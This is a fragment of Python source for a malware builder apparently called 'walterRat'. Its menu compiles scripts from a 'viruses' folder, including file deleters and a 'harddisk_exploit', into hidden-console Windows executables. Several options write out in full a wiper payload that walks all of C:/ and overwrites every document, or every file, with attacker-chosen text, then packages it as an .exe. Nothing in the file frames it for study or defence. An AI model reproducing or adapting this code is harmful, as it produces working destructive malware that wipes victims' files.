    """%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])+selection
                inpt=raw_input(options)
                if inpt=="1":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_exe.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_exe.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="2":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_pdf.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_pdf.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="3":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_txt.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_txt.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="4":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_mp3.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_mp3.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="5":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_mp4.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_mp4.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="6":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_lnk.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_lnk.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="7":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_docx.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_docx.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="8":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_xlsx.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_xlsx.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="9":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_xml.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_xml.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="10":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_png.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_png.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="11":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_jpg.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_jpg.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="12":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_all.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_all.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="13":
                    os.system("clear")
                    self.__init__()
                    print "%s[%s!%s]%sInput The Text That You Want To Change%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"RepTxt"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    rep_txt=raw_input(ac)
                    with open("rep_txt.py","w") as text:
                        text.write("""
import os
import random
import sys
os.system("cls")
for a,b,c in os.walk("C:/"):
    for i in c:
        try:
            os.chdir(a)
        except:
            pass
        try:
            if i.endsswith(".txt"):  
                with open(i,"w") as file:
                    file.write('%s')
                    
        except:
            pass                     
    """%rep_txt)

                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  rep_txt.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/rep_txt.exe .")
                    os.system("sudo rm -r dist/ build/ rep_txt.spec rep_txt.py")
                elif inpt=="14":
                    os.system("clear")
                    self.__init__()
                    print "%s[%s!%s]%sInput The Text That You Want To Change%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"RepPdf"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    rep_txt=raw_input(ac)
                    with open("rep_pdf.py","w") as text:
                        text.write("""
import os
import random
import sys
os.system("cls")
for a,b,c in os.walk("C:/"):
    for i in c:
        try:
            os.chdir(a)
        except:
            pass
        try:
            if i.endswith(".pdf"): 
                with open(i,"w") as file:
                    file.write('%s')
                    
        except:
            pass                     
    """%rep_txt)

                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  rep_pdf.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/rep_pdf.exe .")
                    os.system("sudo rm -r dist/ build/ rep_pdf.spec rep_pdf.py")
                elif inpt=="15":
                    os.system("clear")
                    self.__init__()
                    print "%s[%s!%s]%sInput The Text That You Want To Change%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"RepDocx"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    rep_txt=raw_input(ac)
                    with open("rep_docx.py","w") as text:
                        text.write("""
import os
import random
import sys
os.system("cls")
for a,b,c in os.walk("C:/"):
    for i in c:
        try:
            os.chdir(a)
        except:
            pass
        try:
            if i.endswith(".docx"): 
                with open(i,"w") as file:
                    file.write('%s')
                    
        except:
            pass                     
    """%rep_txt)

                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  rep_docx.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/rep_docx.exe .")
                    os.system("sudo rm -r dist/ build/ rep_docx.spec rep_docx.py")
                elif inpt=="16":
                    os.system("clear")
                    self.__init__()
                    print "%s[%s!%s]%sInput The Text That You Want To Change%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"RepXlsx"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    rep_txt=raw_input(ac)
                    with open("rep_xlsx.py","w") as text:
                        text.write("""
import os
import random
import sys
os.system("cls")
for a,b,c in os.walk("C:/"):
    for i in c:
        try:
            os.chdir(a)
        except:
            pass
        try:
            if i.endswith(".xlsx"): 
                with open(i,"w") as file:
                    file.write('%s')
                    
        except:
            pass                     
    """%rep_txt)

                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  rep_xlsx.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/rep_xlsx.exe .")
                    os.system("sudo rm -r dist/ build/ rep_xlsx.spec rep_xlsx.py")
                elif inpt=="17":
                    os.system("clear")
                    self.__init__()
                    print "%s[%s!%s]%sInput The Text That You Want To Change%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"RepAll"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    rep_txt=raw_input(ac)
                    with open("rep_all.py","w") as text:
                        text.write("""
import os
import random
import sys
os.system("cls")
for a,b,c in os.walk("C:/"):
    for i in c:
        try:
            os.chdir(a)
        except:
            pass
        try:
            with open(i,"w") as file:
                file.write('%s')
                    
        except:
            pass                     
    """%rep_txt)

                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  rep_all.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/rep_all.exe .")
                    os.system("sudo rm -r dist/ build/ rep_all.spec rep_all.py")
                elif inpt=="18":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/harddisk_exploit.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/harddisk_exploit.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
        else:
            os.system("clear")
            self.__init__()
            print colors["RED"]+"[!]%sChoose Your Language Correctly"%(colors["YELLOW"])          

wRat=walterRat()
wRat.run()
